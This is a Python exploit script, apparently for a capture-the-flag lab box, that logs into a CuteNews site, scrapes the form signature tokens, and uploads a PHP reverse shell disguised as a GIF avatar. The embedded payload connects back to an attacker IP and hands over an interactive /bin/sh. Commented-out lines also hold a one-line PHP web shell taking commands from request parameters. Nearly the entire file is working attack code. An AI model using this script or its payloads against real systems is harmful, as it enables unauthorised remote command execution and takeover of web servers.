import requests

def create_payload():
    payload ="""GIF8;
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.51';  // CHANGE THIS
$port = 9000;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);


$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
"""
    return payload



def init_login(base,user,passw):
    sesh = requests.Session()
    data = {"action":"dologin","username":f"{user}","password":f"{passw}"}
    url = base + "index.php"
    resp = sesh.post(url,data=data)
    print(resp)
    #print(resp.text)
    #print(sesh.cookies)
    return sesh


def get_form_parameters_needed(sesh,base):
    url = base + "index.php"
    params = {"mod":"main","opt":"personal"}
    resp = sesh.get(url,params=params)
    print(resp)
    for_upload = []
    key = resp.text.split("__signature_key\" value=\"")[1].split("\"")[0]
    dsi = resp.text.split("__signature_dsi\" value=\"")[1].split("\"")[0]
    for_upload.append(key)
    for_upload.append(dsi)
    print("Found DSI and KEY")
    return for_upload



def upload_payload(sesh,base,key_dsi,nickname,rev_shell):
    url = base + "index.php"
    key = key_dsi[0]
    dsi = key_dsi[1]
    edit_nickname = nickname
    payload_name = "reverseshell.php"
    multiple_files = [("mod",(None,"main")),
                      ("opt",(None,"personal")),
                      ("__signature_key",(None,key)),
                      ("__signature_dsi",(None,dsi)),
                      ("editpassword",(None,"")),
                      ("confirmpassword",(None,"")),
                      ("editnickname",(None,f"{edit_nickname}")),
                      ("more[site]",(None,"")),
                      ("more[about]",(None,"")),
                      ("avatar_file",(f"{payload_name}",f"{rev_shell}","image/gif"))]
                      #("avatar_file",(f"{payload_name}","GIF8;<?php system($_REQUEST['cmd']); ?>","image/gif"))]
    #proxies={"http":"127.0.0.1:8080"}
    #resp = sesh.post(url,files=multiple_files,proxies=proxies)
    resp = sesh.post(url,files=multiple_files)
    print(resp)
    if "User info updated!" in resp.text:
        print("Successfully Uploaded PHP SHELL")
        print(f"Access CMD Here {base}uploads/avatar_latortuga_{payload_name}")
    else:
        print(resp.text)
    #print(sesh.headers) 
    #print(sesh.cookies)


def main():
    ip = "10.10.14.51"
    port = "9000"
    rev_shell = create_payload()
    #print(rev_shell)
    #print(rev_shell.encode())
    #quit()
    # create a low priv user if you havent already
    baseurl = "http://10.10.10.206/CuteNews/"
    username = "latortuga"
    password = "dawoof7123"
    nickname = "turtle"
    sesh = init_login(baseurl,username,password)
    print("logged in")
    key_dsi = get_form_parameters_needed(sesh,baseurl)
    upload_payload(sesh,baseurl,key_dsi,nickname,rev_shell)
	

main()


#multiple_files = [('file',(f'{filename}.gif.php5',"GIF8;<?php system($_REQUEST['cmd']); ?>",'image/gif')),('submit',(None,'upload file'))]
#resp = requests.post(url,files=multiple_files)
'''
<input type="hidden" name="__signature_key" value="fc3140f0c9e4dc1568c58267d7191f9a-latortuga" />
<input type="hidden" name="__signature_dsi" value="95c959de587a15a7f24ebf9399217bb0" />
'''
